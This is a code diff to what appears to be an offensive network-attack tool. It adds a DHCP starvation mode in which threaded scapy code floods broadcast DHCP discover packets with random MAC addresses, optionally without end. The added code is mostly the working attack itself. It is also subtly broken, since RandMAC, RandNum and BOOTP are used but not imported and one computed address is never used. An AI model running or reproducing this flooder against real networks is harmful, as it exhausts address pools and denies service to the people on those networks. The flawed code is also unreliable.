@@ -18,6 +18,12 @@ try:
     from core import printer
     from core import asciigraphs
 
+    import threading
+    import queue
+    from scapy.all import get_if_raw_hwaddr, Ether, IP
+    from scapy.all import UDP, RandString, DHCP, sendp
+    from scapy.all import conf as confs
+
 except BaseException as err:
     print("While importing dependency modules, an error occured: {0}".format(str(err)))
     importerror = True
@@ -417,8 +423,31 @@ to stop attack.", 0)
 Please manually kill ettercap by typing `killall ettercap` in your terminal.", 1)
                         return 0
 
-            # elif values['attack_mode'].lower() == 'dhcp':
-            #     try:
+            elif values['attack_mode'].lower() == 'dhcp':
+                last = values['packet_size']
+
+                threads = []
+                try:
+                    if last != 0:
+                        for i in range(0, last):
+                            DHCPr = DHCPRequest(values['target'], i + 2)
+                            DHCPr.start()
+                            threads.append(DHCPr)
+
+                    else:
+                        i = 2
+                        while True:
+                            DHCPr = DHCPRequest(values['target'], i)
+                            DHCPr.start()
+                            threads.append(DHCPr)
+                            i += 1
+
+                except(KeyboardInterrupt, EOFError):
+                    for thread in threads:
+                        thread.join()
+
+                    printer.Printer().print_with_status("Attack stopped.", 1)
+                    return 0
 
             else:
                 printer.Printer().print_with_status("Invalid attack_mode!", 2)
@@ -535,3 +564,25 @@ Please manually kill ettercap by typing `killall ettercap` in your terminal.", 1
         else:
             printer.Printer().print_with_status("Invalid protocol! Aborting attack.", 2)
             raise exceptions.InvalidParameterError()
+
+
+class DHCPRequest(threading.Thread):
+    last = 0
+    router = None
+
+    def __init__(self, router, last):
+        self.router = router
+        self.last = str(last)
+        threading.Thread.__init__(self)
+
+    def run(self):
+        baseip = ".".join(self.router.split('.')[0:-1]) + '.'
+        targetip = baseip+self.last
+        confs.checkIPaddr = False
+        hw = get_if_raw_hwaddr(confs.iface)
+        dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/\
+                IP(src="0.0.0.0",dst="255.255.255.255")/\
+                UDP(sport=68, dport=67)/\
+                BOOTP(chaddr=RandString(RandNum(1,50)))/\
+                DHCP(options=[("message-type","discover"),"end"])
+        sendp(dhcp_discover, verbose=0)
